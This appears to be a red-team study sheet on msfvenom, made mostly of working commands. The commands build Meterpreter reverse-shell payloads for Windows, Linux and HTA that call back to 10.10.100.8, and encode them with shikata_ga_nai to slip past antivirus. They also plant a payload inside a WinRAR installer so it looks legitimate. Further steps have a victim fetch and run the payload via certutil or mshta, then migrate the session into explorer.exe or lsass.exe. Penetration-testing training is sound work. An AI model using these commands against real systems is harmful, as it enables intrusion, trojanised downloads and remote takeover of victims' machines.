## 🔍 What Is Msfvenom?

- **Command-line payload generator** for Metasploit Framework
- **Replaced** legacy tools `msfpayload` + `msfencode`
- Generates **shellcode** (executable machine code) for:
  - Windows (PE executables, DLLs)
  - Linux (ELF binaries)
  - Web apps (PHP, ASP, JSP)
  - Scripting languages (PowerShell, Python, Bash)

> 💡 **Shellcode** = raw machine instructions embedded in payload that performs malicious actions (e.g., reverse shell)

---
## 🧪 Basic Payload Generation

### List Available Payloads
```bash
msfvenom --list payloads | grep "meterpreter"
```

### Windows Payload (32-bit)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -f exe > payload.exe
```
- `-p`: Payload type (`windows/meterpreter/reverse_tcp`)
- `-f exe`: Output format (Windows executable)
- `> payload.exe`: Redirect output to file (**required for binaries**)

### Linux Payload (32-bit)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -f elf > payload
```
> ❓ **Why no `.elf` extension?**  
> Linux executables **don't require extensions** — the ELF header identifies the binary format. Adding `.elf` is optional but not necessary for execution.

### List Output Formats
```bash
msfvenom -l formats
```
| Format | Use Case |
|--------|----------|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `dll` | Windows DLL (for DLL injection) |
| `psh` | PowerShell script |
| `hta` | HTML Application (for `mshta.exe` delivery) |

---
## 🛡️ Encoding to Evade Signature Detection

### Why Encode?
- Obfuscates shellcode to bypass **signature-based AV**
- **Does NOT bypass behavioral/EDR detection** (modern AVs detect execution patterns)
- ⚠️ **Critical reality**: Encoding alone **fails against modern AV/EDR** (Defender, CrowdStrike, SentinelOne)

### Shikata Ga Nai Encoder
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -e x86/shikata_ga_nai -f exe > encoded.exe
```
✅ Output:
```
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 537 (iteration=0)
Payload size: 537 bytes
Final size of exe file: 7680 bytes
```

> ❓ **Does `x86/shikata_ga_nai` work on x64?**  
> ❌ **NO** — despite the name, this encoder is **32-bit only**.  
> ✅ For x64 payloads, MSF **automatically selects compatible encoders** (e.g., `x64/xor`), but options are limited.

### Multiple Encoding Iterations
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe > encoded.exe
```
- `-i 10`: Apply encoder **10 times** (polymorphic mutation)
- Each iteration increases payload size slightly:
  ```
  iteration=0 → 537 bytes
  iteration=9 → 780 bytes
  ```
> ⚠️ **Diminishing returns**:  
> - Iterations 1–5: Moderate evasion improvement  
> - Iterations >10: **Negligible gains** (AVs detect encoding patterns)  
> - Modern EDRs ignore encoding — focus on **execution behavior**

---
## 💉 Payload Injection (Template-Based)

### Inject into Legitimate Executable
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 \
         -i 10 -e x86/shikata_ga_nai \
         -f exe \
         -x ~/Downloads/wrar602.exe \          # Template binary
         > winrar.exe
```
- `-x`: Inject payload into **existing executable** (preserves icons, metadata, digital signatures)
- Result: `winrar.exe` appears legitimate but spawns Meterpreter on execution

### Keep Original Functionality (`-k` flag)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 \
         -i 10 -e x86/shikata_ga_nai \
         -f exe \
         -k \                                  # Keep original app running
         -x ~/Downloads/wrar602.exe \
         > winrar-new.exe
```
> ⚠️ **Critical limitation**:  
> ```
> ERROR: The template file doesn't have any exports to inject into!
> ```
> - Only works with **DLLs or executables with export tables** (rare for EXEs)
> - Most EXEs **cannot preserve original functionality** — payload replaces main execution flow
> - `-k` is **largely obsolete** in modern red teaming

---
## 🌐 Payload Delivery Methods

### Host via HTTP Server
```bash
python3 -m http.server 80
```
- Accessible at `http://<attacker_ip>/payload.exe`
- Victim downloads via:
  ```cmd
  certutil -urlcache -f http://10.10.100.8/payload.exe payload.exe
  ```

### HTA Delivery (Bypasses Restrictions)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -f hta > payload.hta
```
- Host via `python3 -m http.server 80`
- Victim executes:
  ```powershell
  mshta.exe http://10.10.100.8/payload.hta
  ```
> 💡 **Why HTA works**:  
> - `mshta.exe` is **whitelisted** by Windows  
> - Bypasses PowerShell restrictions/AMSI  
> - Executes VBScript with **full privileges**

---
## 🦸 Post-Exploitation: Process Migration

### Why Migrate?
- Initial payload runs in **unstable process** (e.g., `payload.exe`)
- If process crashes/killed → **session dies**
- Migration moves Meterpreter to **persistent process** (e.g., `explorer.exe`)

### Automatic Migration
```msf
meterpreter > run post/windows/manage/migrate
```
✅ Automatically:
1. Spawns `notepad.exe` (or other benign process)
2. Migrates Meterpreter into it
3. Kills original payload process

> ❓ **Does it require manual `migrate <PID>`?**  
> ❌ **No** — this module **fully automates** migration (no manual PID lookup needed)

### Manual Migration
```msf
meterpreter > ps                      # List processes
meterpreter > migrate 3512           # Migrate to PID 3512 (explorer.exe)
```

### Best Practices
| Target Process | Why Use It |
|---------------|------------|
| `explorer.exe` | Always running, user context |
| `lsass.exe` | SYSTEM privileges (requires prior elevation) |
| `svchost.exe` | Service context, less suspicious |

> ⚠️ **Critical**: Migration **does not bypass AV** — it only prevents session loss from process termination.

---
## 🔑 Key Takeaways

| Concept | Reality Check |
|--------|---------------|
| **Encoding** | Largely ineffective vs modern AV/EDR (use custom shellcode/obfuscation instead) |
| **`shikata_ga_nai`** | 32-bit only — limited value for x64 payloads |
| **Template injection** | Preserves appearance only — original app functionality usually broken |
| **`-k` flag** | Rarely works on EXEs — mostly useful for DLL injection |
| **HTA delivery** | Still effective bypass for PowerShell restrictions |
| **Migration** | Prevents session loss — **not** an evasion technique |

> 🔥 **Golden Rule**:  
> **Encoding ≠ Evasion** in 2026. Modern red teaming requires:  
> - Custom shellcode (Cobalt Strike, Sliver)  
> - Process injection (not just migration)  
> - Living-off-the-land binaries (LOLBins)  
> - EDR-aware execution (direct syscalls, unhooking)

